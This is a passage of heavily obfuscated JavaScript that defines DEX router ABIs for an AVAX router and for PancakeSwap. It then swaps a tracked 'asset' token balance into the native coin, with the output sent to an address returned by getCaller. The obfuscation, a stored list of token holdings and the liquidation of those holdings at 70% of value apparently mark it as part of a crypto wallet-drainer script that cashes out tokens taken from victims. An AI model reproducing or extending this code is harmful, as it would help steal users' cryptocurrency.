          const _0x5bd308 = {
            internalType: "address[]",
            name: "path",
            type: "address[]"
          };
          const _0x171f71 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x416e68 = {
            internalType: 'uint256',
            name: 'deadline',
            type: "uint256"
          };
          const _0x4c2ba2 = {
            internalType: "uint256[]",
            name: "amounts",
            type: 'uint256[]'
          };
          const _0x1c9b56 = {
            inputs: [_0x22fce1, _0x5bd308, _0x171f71, _0x416e68],
            name: "swapExactAVAXForTokens",
            outputs: [_0x4c2ba2],
            stateMutability: "payable",
            type: "function"
          };
          const _0x242c0a = {
            internalType: "uint256",
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x17d557 = {
            internalType: "address[]",
            name: "path",
            type: "address[]"
          };
          const _0x83f145 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x305db4 = {
            internalType: "uint256",
            name: "deadline",
            type: 'uint256'
          };
          const _0xdde5ec = {
            inputs: [_0x242c0a, _0x17d557, _0x83f145, _0x305db4],
            name: "swapExactAVAXForTokensSupportingFeeOnTransferTokens",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x5dc7fb = {
            internalType: "uint256",
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x32017c = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x344190 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x174d44 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x30fbbe = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x5a6b10 = {
            inputs: [_0x5dc7fb, _0x32017c, _0x344190, _0x174d44, _0x30fbbe],
            name: "swapExactTokensForAVAX",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': 'uint256[]'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x23873a = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x4b1e53 = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0xc2e443 = {
            internalType: "address[]",
            name: "path",
            type: "address[]"
          };
          const _0x36791e = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x10d9d2 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x2d23b6 = {
            inputs: [_0x23873a, _0x4b1e53, _0xc2e443, _0x36791e, _0x10d9d2],
            name: "swapExactTokensForAVAXSupportingFeeOnTransferTokens",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x3ecd0f = {
            internalType: "uint256",
            name: 'amountIn',
            type: "uint256"
          };
          const _0x4a8698 = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x481d91 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x58a764 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x1a8615 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x454e4f = {
            inputs: [_0x3ecd0f, _0x4a8698, _0x481d91, _0x58a764, _0x1a8615],
            name: "swapExactTokensForTokens",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': "uint256[]"
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x41ccae = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x3f818c = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x300d16 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x57d26d = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x46d185 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0xc1881c = {
            inputs: [_0x41ccae, _0x3f818c, _0x300d16, _0x57d26d, _0x46d185],
            name: "swapExactTokensForTokensSupportingFeeOnTransferTokens",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x111d9b = {
            internalType: 'uint256',
            name: 'amountOut',
            type: 'uint256'
          };
          const _0x2207aa = {
            internalType: "uint256",
            name: "amountInMax",
            type: 'uint256'
          };
          const _0x2f7c12 = {
            internalType: "address[]",
            name: 'path',
            type: 'address[]'
          };
          const _0x206b4c = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x2dbdb = {
            internalType: "uint256",
            name: 'deadline',
            type: "uint256"
          };
          const _0x4c72a1 = {
            inputs: [_0x111d9b, _0x2207aa, _0x2f7c12, _0x206b4c, _0x2dbdb],
            name: "swapTokensForExactAVAX",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': "uint256[]"
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x321a81 = {
            internalType: 'uint256',
            name: 'amountOut',
            type: 'uint256'
          };
          const _0x1a7708 = {
            internalType: 'uint256',
            name: "amountInMax",
            type: 'uint256'
          };
          const _0x490074 = {
            internalType: "address[]",
            name: "path",
            type: "address[]"
          };
          const _0x1c48cf = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x55c455 = {
            internalType: 'uint256',
            name: "deadline",
            type: 'uint256'
          };
          const _0x1444ab = {
            inputs: [_0x321a81, _0x1a7708, _0x490074, _0x1c48cf, _0x55c455],
            name: "swapTokensForExactTokens",
            outputs: [{
              'internalType': "uint256[]",
              'name': "amounts",
              'type': 'uint256[]'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x212029 = {
            stateMutability: "payable",
            type: 'receive'
          };
          let _0x138775 = [_0x3fcdcd, _0x43302a, _0x185100, _0x44b90a, _0x25b968, _0x5d7813, _0x8724f4, _0x3d3af3, _0x41b29a, _0x7cb6fd, _0x35c537, _0x1ea99e, _0x28244c, _0x16ae1b, _0x1e4aa9, _0x4e6146, _0x1db655, _0x1c9b56, _0xdde5ec, _0x5a6b10, _0x2d23b6, _0x454e4f, _0xc1881c, _0x4c72a1, _0x1444ab, _0x212029];
          let _0x5afc17 = new ethers.Contract(_0x3941f8, _0x138775, _0xab3127);
          let _0xa6868e = [];
          _0xa6868e[0] = _0x2a18aa.asset.token;
          _0xa6868e[1] = "0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7";
          try {
            let _0x2be84b = this.token_array.find(_0x5a9fe4 => _0x5a9fe4.token_address == _0x2a18aa.asset.token && _0x5a9fe4.chain == _0x2a18aa.chain);
            let _0x3ed12e = this.token_array.find(_0x42b31d => _0x42b31d.token_address == "native" && _0x42b31d.chain == _0x2a18aa.chain);
            _0xcd0737 = this.web3Js.utils.toBN(this.web3Js.utils.toWei((Number(_0x2be84b.value) * Number(0.7) / Number(_0x3ed12e.price)).toString(), 'ether'));
          } catch {}
          return [_0x5afc17.swapExactTokensForAVAX(_0x2a18aa.asset.amount, _0xcd0737, _0xa6868e, this.getCaller(_0x2a18aa), _0x4d5eff), _0xa6868e[1]];
        }
      case "Pancake":
        {
          const _0x43cc03 = {
            internalType: "address",
            name: "_factory",
            type: "address"
          };
          const _0x3f3f1f = {
            internalType: "address",
            name: "_WETH",
            type: "address"
          };
          const _0x339596 = {
            inputs: [_0x43cc03, _0x3f3f1f],
            stateMutability: "nonpayable",
            type: "constructor"
          };
          const _0x23c942 = {
            internalType: "address",
            name: '',
            type: "address"
          };
          const _0x129973 = {
            inputs: [],
            name: 'WETH',
            outputs: [_0x23c942],
            stateMutability: "view",
            type: "function"
          };
          const _0x154f51 = {
            internalType: "address",
            name: "tokenA",
            type: "address"
          };
          const _0x4a9c64 = {
            internalType: "address",
            name: 'tokenB',
            type: "address"
          };
          const _0x3b59bb = {
            internalType: "uint256",
            name: "amountADesired",
            type: 'uint256'
          };
          const _0x314aa5 = {
            internalType: 'uint256',
            name: "amountBDesired",
            type: 'uint256'
          };
          const _0xb11d37 = {
            internalType: 'uint256',
            name: "amountAMin",
            type: 'uint256'
          };
          const _0x1d02a8 = {
            internalType: 'uint256',
            name: "amountBMin",
            type: 'uint256'
          };
          const _0x5daf97 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x26c675 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x53b36b = {
            inputs: [_0x154f51, _0x4a9c64, _0x3b59bb, _0x314aa5, _0xb11d37, _0x1d02a8, _0x5daf97, _0x26c675],
            name: "addLiquidity",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountA",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "amountB",
              'type': "uint256"
            }, {
              'internalType': 'uint256',
              'name': "liquidity",
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x1f072d = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x14d7b9 = {
            internalType: "uint256",
            name: "amountTokenDesired",
            type: 'uint256'
          };
          const _0x10a885 = {
            internalType: 'uint256',
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0x2703b9 = {
            internalType: 'uint256',
            name: "amountETHMin",
            type: 'uint256'
          };
          const _0x2006e8 = {
            internalType: 'address',
            name: 'to',
            type: "address"
          };
          const _0x472c55 = {
            internalType: 'uint256',
            name: 'deadline',
            type: "uint256"
          };
          const _0x493ffd = {
            inputs: [_0x1f072d, _0x14d7b9, _0x10a885, _0x2703b9, _0x2006e8, _0x472c55],
            name: "addLiquidityETH",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountToken",
              'type': "uint256"
            }, {
              'internalType': "uint256",
              'name': "amountETH",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "liquidity",
              'type': "uint256"
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x4fdd78 = {
            internalType: "address",
            name: '',
            type: 'address'
          };
          const _0x27b037 = {
            inputs: [],
            name: "factory",
            outputs: [_0x4fdd78],
            stateMutability: "view",
            type: "function"
          };
          const _0x48443b = {
            internalType: "uint256",
            name: 'amountOut',
            type: "uint256"
          };
          const _0x47ed46 = {
            internalType: 'uint256',
            name: 'reserveIn',
            type: "uint256"
          };
          const _0x13741d = {
            internalType: "uint256",
            name: 'reserveOut',
            type: 'uint256'
          };
          const _0x508a23 = {
            inputs: [_0x48443b, _0x47ed46, _0x13741d],
            name: "getAmountIn",
            outputs: [{
              'internalType': 'uint256',
              'name': 'amountIn',
              'type': 'uint256'
            }],
            stateMutability: 'pure',
            type: "function"
          };
          const _0x231c3f = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x40509f = {
            internalType: 'uint256',
            name: 'reserveIn',
            type: 'uint256'
          };
          const _0x57a47a = {
            internalType: 'uint256',
            name: 'reserveOut',
            type: "uint256"
          };
          const _0x324da5 = {
            inputs: [_0x231c3f, _0x40509f, _0x57a47a],
            name: "getAmountOut",
            outputs: [{
              'internalType': "uint256",
              'name': 'amountOut',
              'type': "uint256"
            }],
            stateMutability: 'pure',
            type: "function"
          };
          const _0x423914 = {
            internalType: 'uint256',
            name: 'amountOut',
            type: "uint256"
          };
          const _0x328b2d = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x1cedca = {
            internalType: 'uint256[]',
            name: "amounts",
            type: 'uint256[]'
          };
          const _0x1fd4c9 = {
            inputs: [_0x423914, _0x328b2d],
            name: "getAmountsIn",
            outputs: [_0x1cedca],
            stateMutability: "view",
            type: "function"
          };
          const _0x349269 = {
            internalType: "uint256",
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x22f663 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x3250cf = {
            inputs: [_0x349269, _0x22f663],
            name: "getAmountsOut",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': 'uint256[]'
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x4e1e33 = {
            internalType: "uint256",
            name: "amountA",
            type: 'uint256'
          };
          const _0x2e6dd2 = {
            internalType: 'uint256',
            name: 'reserveA',
            type: 'uint256'
          };
          const _0x565a5a = {
            internalType: 'uint256',
            name: "reserveB",
            type: 'uint256'
          };
          const _0x3ea5ac = {
            inputs: [_0x4e1e33, _0x2e6dd2, _0x565a5a],
            name: "quote",
            outputs: [{
              'internalType': "uint256",
              'name': "amountB",
              'type': 'uint256'
            }],
            stateMutability: 'pure',
            type: "function"
          };
          const _0x1b2f3e = {
            internalType: "address",
            name: "tokenA",
            type: "address"
          };
          const _0xeb18a4 = {
            internalType: "address",
            name: "tokenB",
            type: "address"
          };
          const _0x52d012 = {
            internalType: 'uint256',
            name: "liquidity",
            type: 'uint256'
          };
          const _0x44f9c4 = {
            internalType: 'uint256',
            name: "amountAMin",
            type: 'uint256'
          };
          const _0x14e224 = {
            internalType: 'uint256',
            name: "amountBMin",
            type: 'uint256'
          };
          const _0x59dfa2 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x2c049 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x12f180 = {
            inputs: [_0x1b2f3e, _0xeb18a4, _0x52d012, _0x44f9c4, _0x14e224, _0x59dfa2, _0x2c049],
            name: "removeLiquidity",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountA",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "amountB",
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x97037a = {
            internalType: "address",
            name: 'token',
            type: 'address'
          };
          const _0x3ef12f = {
            internalType: 'uint256',
            name: "liquidity",
            type: "uint256"
          };
          const _0x197114 = {
            internalType: 'uint256',
            name: "amountTokenMin",
            type: "uint256"
          };
          const _0xeda9b5 = {
            internalType: 'uint256',
            name: "amountETHMin",
            type: 'uint256'
          };
          const _0x21b178 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x4ce6a2 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0xfa87e8 = {
            internalType: "uint256",
            name: 'amountETH',
            type: 'uint256'
          };
          const _0x36073e = {
            inputs: [_0x97037a, _0x3ef12f, _0x197114, _0xeda9b5, _0x21b178, _0x4ce6a2],
            name: "removeLiquidityETH",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountToken",
              'type': 'uint256'
            }, _0xfa87e8],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x1ec055 = {
            internalType: 'address',
            name: 'token',
            type: "address"
          };
          const _0x497b97 = {
            internalType: 'uint256',
            name: "liquidity",
            type: 'uint256'
          };
          const _0x1d526a = {
            internalType: 'uint256',
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0x301ae3 = {
            internalType: "uint256",
            name: "amountETHMin",
            type: 'uint256'
          };
          const _0x440771 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0xe9e798 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x31487f = {
            internalType: 'uint256',
            name: "amountETH",
            type: 'uint256'
          };
          const _0x5c1f21 = {
            inputs: [_0x1ec055, _0x497b97, _0x1d526a, _0x301ae3, _0x440771, _0xe9e798],
            name: "removeLiquidityETHSupportingFeeOnTransferTokens",
            outputs: [_0x31487f],
            stateMutability: 'nonpayable',
            type: "function"
          };
          const _0x386ee7 = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x319f8f = {
            internalType: "uint256",
            name: "liquidity",
            type: 'uint256'
          };
          const _0x88876f = {
            internalType: 'uint256',
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0x2d7577 = {
            internalType: "uint256",
            name: "amountETHMin",
            type: 'uint256'
          };
          const _0x43a751 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x21323 = {
            internalType: "uint256",
            name: 'deadline',
            type: 'uint256'
          };
          const _0x5621f1 = {
            internalType: "bool",
            name: "approveMax",
            type: "bool"
          };
          const _0x1a5a8d = {
            internalType: "uint8",
            name: 'v',
            type: "uint8"
          };
          const _0x320970 = {
            internalType: "bytes32",
            name: 'r',
            type: "bytes32"
          };
          const _0x5e11a7 = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0x958dd2 = {
            inputs: [_0x386ee7, _0x319f8f, _0x88876f, _0x2d7577, _0x43a751, _0x21323, _0x5621f1, _0x1a5a8d, _0x320970, _0x5e11a7],
            name: "removeLiquidityETHWithPermit",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountToken",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "amountETH",
              'type': "uint256"
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x55adcd = {
            internalType: "address",
            name: "token",
            type: "address"
          };
          const _0x3fbcb9 = {
            internalType: "uint256",
            name: "liquidity",
            type: 'uint256'
          };
          const _0x3a0d56 = {
            internalType: "uint256",
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0x2b1dea = {
            internalType: 'uint256',
            name: "amountETHMin",
            type: 'uint256'
          };
          const _0x314486 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x58b53d = {
            internalType: "uint256",
            name: 'deadline',
            type: 'uint256'
          };
          const _0x4f529e = {
            internalType: "bool",
            name: "approveMax",
            type: "bool"
          };
          const _0x40db1c = {
            internalType: "uint8",
            name: 'v',
            type: "uint8"
          };
          const _0x1b6c61 = {
            internalType: "bytes32",
            name: 'r',
            type: "bytes32"
          };
          const _0x274381 = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0x6e7667 = {
            internalType: 'uint256',
            name: "amountETH",
            type: 'uint256'
          };
          const _0x12d00e = {
            inputs: [_0x55adcd, _0x3fbcb9, _0x3a0d56, _0x2b1dea, _0x314486, _0x58b53d, _0x4f529e, _0x40db1c, _0x1b6c61, _0x274381],
            name: "removeLiquidityETHWithPermitSupportingFeeOnTransferTokens",
            outputs: [_0x6e7667],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x1ccdfc = {
            internalType: "address",
            name: "tokenA",
            type: "address"
          };
          const _0x3de7d3 = {
            internalType: "address",
            name: "tokenB",
            type: "address"
          };
          const _0x27579a = {
            internalType: 'uint256',
            name: "liquidity",
            type: 'uint256'
          };
          const _0x2b1a93 = {
            internalType: 'uint256',
            name: "amountAMin",
            type: 'uint256'
          };
          const _0x21f51a = {
            internalType: 'uint256',
            name: "amountBMin",
            type: 'uint256'
          };
          const _0x2ba426 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x381971 = {
            internalType: "uint256",
            name: 'deadline',
            type: 'uint256'
          };
          const _0x104dee = {
            internalType: "bool",
            name: "approveMax",
            type: "bool"
          };
          const _0x3ac361 = {
            internalType: "uint8",
            name: 'v',
            type: "uint8"
          };
          const _0x295c28 = {
            internalType: "bytes32",
            name: 'r',
            type: "bytes32"
          };
          const _0x66751c = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0xa85f5d = {
            inputs: [_0x1ccdfc, _0x3de7d3, _0x27579a, _0x2b1a93, _0x21f51a, _0x2ba426, _0x381971, _0x104dee, _0x3ac361, _0x295c28, _0x66751c],
            name: "removeLiquidityWithPermit",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountA",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "amountB",
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x5d95ec = {
            internalType: 'uint256',
            name: "amountOut",
            type: "uint256"
          };
          const _0x5e6feb = {
            internalType: "address[]",
            name: "path",
            type: "address[]"
          };
          const _0x29aa43 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x4c6564 = {
            internalType: 'uint256',
            name: "deadline",
            type: 'uint256'
          };
          const _0xec80f0 = {
            inputs: [_0x5d95ec, _0x5e6feb, _0x29aa43, _0x4c6564],
            name: "swapETHForExactTokens",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': 'uint256[]'
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x2a985e = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x3b8b28 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x277c2d = {
            internalType: 'address',
            name: 'to',
            type: "address"
          };
          const _0x5bda5a = {
            internalType: 'uint256',
            name: "deadline",
            type: 'uint256'
          };
          const _0x2bfb0a = {
            internalType: "uint256[]",
            name: "amounts",
            type: 'uint256[]'
          };
          const _0x4a4a1f = {
            inputs: [_0x2a985e, _0x3b8b28, _0x277c2d, _0x5bda5a],
            name: "swapExactETHForTokens",
            outputs: [_0x2bfb0a],
            stateMutability: "payable",
            type: "function"
          };
          const _0x58d31a = {
            internalType: "uint256",
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x2b649c = {
            internalType: "address[]",
            name: 'path',
            type: 'address[]'
          };
          const _0x152f2c = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x4932e9 = {
            internalType: 'uint256',
            name: "deadline",
            type: "uint256"
          };
          const _0x294ca6 = {
            inputs: [_0x58d31a, _0x2b649c, _0x152f2c, _0x4932e9],
            name: "swapExactETHForTokensSupportingFeeOnTransferTokens",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x144852 = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x42ef29 = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: "uint256"
          };
          const _0x2dde66 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x3d4f30 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x5f237e = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x481496 = {
            inputs: [_0x144852, _0x42ef29, _0x2dde66, _0x3d4f30, _0x5f237e],
            name: "swapExactTokensForETH",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': "uint256[]"
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x569f6b = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x120097 = {
            internalType: "uint256",
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x2952b3 = {
            internalType: "address[]",
            name: "path",
            type: "address[]"
          };
          const _0x451d33 = {
            internalType: 'address',
            name: 'to',
            type: "address"
          };
          const _0x10bca4 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x386f92 = {
            inputs: [_0x569f6b, _0x120097, _0x2952b3, _0x451d33, _0x10bca4],
            name: "swapExactTokensForETHSupportingFeeOnTransferTokens",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x55f576 = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x2e987c = {
            internalType: "uint256",
            name: "amountOutMin",
            type: "uint256"
          };
          const _0x19bc07 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x298f07 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0xaca73f = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x250548 = {
            inputs: [_0x55f576, _0x2e987c, _0x19bc07, _0x298f07, _0xaca73f],
            name: "swapExactTokensForTokens",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': "uint256[]"
            }],
            stateMutability: "nonpayable",
            type: 'function'
          };
          const _0x2a2a11 = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x4a067f = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x4fe325 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x65309 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x2fcca0 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x30dcd5 = {
            inputs: [_0x2a2a11, _0x4a067f, _0x4fe325, _0x65309, _0x2fcca0],
            name: "swapExactTokensForTokensSupportingFeeOnTransferTokens",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x389cdf = {
            internalType: 'uint256',
            name: 'amountOut',
            type: "uint256"
          };
          const _0x387665 = {
            internalType: 'uint256',
            name: "amountInMax",
            type: 'uint256'
          };
          const _0x745668 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x17cf1d = {
            internalType: 'address',
            name: 'to',
            type: "address"
          };
          const _0x5bb32a = {
            internalType: "uint256",
            name: 'deadline',
            type: 'uint256'
          };
          const _0x9a76f8 = {
            inputs: [_0x389cdf, _0x387665, _0x745668, _0x17cf1d, _0x5bb32a],
            name: "swapTokensForExactETH",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': 'uint256[]'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x16fc56 = {
            internalType: 'uint256',
            name: 'amountOut',
            type: 'uint256'
          };
          const _0x44b696 = {
            internalType: 'uint256',
            name: "amountInMax",
            type: 'uint256'
          };
          const _0x1abdff = {
            internalType: 'address[]',
            name: 'path',
            type: "address[]"
          };
          const _0x52f205 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x3af935 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x4c7814 = {
            inputs: [_0x16fc56, _0x44b696, _0x1abdff, _0x52f205, _0x3af935],
            name: "swapTokensForExactTokens",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': 'uint256[]'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x170e7 = {
            stateMutability: "payable",
            type: 'receive'
          };
          let _0x2b1957 = [_0x339596, _0x129973, _0x53b36b, _0x493ffd, _0x27b037, _0x508a23, _0x324da5, _0x1fd4c9, _0x3250cf, _0x3ea5ac, _0x12f180, _0x36073e, _0x5c1f21, _0x958dd2, _0x12d00e, _0xa85f5d, _0xec80f0, _0x4a4a1f, _0x294ca6, _0x481496, _0x386f92, _0x250548, _0x30dcd5, _0x9a76f8, _0x4c7814, _0x170e7];
          let _0x3df301 = new ethers.Contract(_0x3941f8, _0x2b1957, _0xab3127);
          let _0x11e8e6 = await _0x3df301.WETH();
          let _0x3e310e = [];
          _0x3e310e[0] = _0x2a18aa.asset.token;
          _0x3e310e[1] = _0x11e8e6;
          try {
            let _0x56ff24 = this.token_array.find(_0x28eeb5 => _0x28eeb5.token_address == _0x2a18aa.asset.token && _0x28eeb5.chain == _0x2a18aa.chain);
            let _0x5e8000 = this.token_array.find(_0x18e160 => _0x18e160.token_address == "native" && _0x18e160.chain == _0x2a18aa.chain);
            _0xcd0737 = this.web3Js.utils.toBN(this.web3Js.utils.toWei((Number(_0x56ff24.value) * Number(0.7) / Number(_0x5e8000.price)).toString(), "ether"));
          } catch {}
          return [_0x3df301.swapExactTokensForETH(_0x2a18aa.asset.amount, _0xcd0737, _0x3e310e, this.getCaller(_0x2a18aa), _0x4d5eff), _0x11e8e6];
        }
      case "PancakeV2":
        {
          const _0x4b3cba = {
            internalType: "address",
            name: '_factoryV2',
            type: "address"
          };
          const _0x4ac845 = {
            internalType: "address",
            name: "_deployer",
            type: "address"
          };
          const _0x38c488 = {
            internalType: "address",
            name: "_factoryV3",
            type: "address"
          };
          const _0x3af200 = {
            internalType: "address",
            name: "_positionManager",
            type: "address"
          };
          const _0xebaa34 = {
            internalType: "address",
            name: "_stableFactory",
            type: "address"
          };
          const _0x145f07 = {
            internalType: "address",
            name: "_stableInfo",
            type: 'address'
          };
          const _0x2507e8 = {
            internalType: "address",
            name: "_WETH9",
            type: "address"
          };
          const _0x4db681 = {
            inputs: [_0x4b3cba, _0x4ac845, _0x38c488, _0x3af200, _0xebaa34, _0x145f07, _0x2507e8],
            stateMutability: "nonpayable",
            type: "constructor"
          };
          const _0x19816b = {
            indexed: true,
            internalType: "address",
            name: "previousOwner",
            type: "address"
          };
          const _0x446a37 = {
            indexed: true,
            internalType: "address",
            name: "newOwner",
            type: "address"
          };
          const _0x1c4187 = {
            anonymous: false,
            inputs: [_0x19816b, _0x446a37],
            name: "OwnershipTransferred",
            type: 'event'
          };
          const _0x4b8511 = {
            indexed: true,
            internalType: "address",
            name: "factory",
            type: "address"
          };
          const _0x5aeea1 = {
            indexed: true,
            internalType: "address",
            name: "info",
            type: "address"
          };
          const _0x5b20ed = {
            anonymous: false,
            inputs: [_0x4b8511, _0x5aeea1],
            name: "SetStableSwap",
            type: 'event'
          };
          const _0x2eaeb1 = {
            internalType: "address",
            name: '',
            type: "address"
          };
          const _0x352343 = {
            inputs: [],
            name: "WETH9",
            outputs: [_0x2eaeb1],
            stateMutability: "view",
            type: "function"
          };
          const _0x267dcd = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x2f1f78 = {
            inputs: [_0x267dcd],
            name: "approveMax",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x247aa5 = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x2c764a = {
            inputs: [_0x247aa5],
            name: "approveMaxMinusOne",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x5dc591 = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x29a618 = {
            inputs: [_0x5dc591],
            name: "approveZeroThenMax",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x2d97f3 = {
            internalType: 'address',
            name: 'token',
            type: "address"
          };
          const _0x298361 = {
            inputs: [_0x2d97f3],
            name: "approveZeroThenMaxMinusOne",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x636e75 = {
            internalType: "bytes",
            name: "data",
            type: "bytes"
          };
          const _0xab5216 = {
            inputs: [_0x636e75],
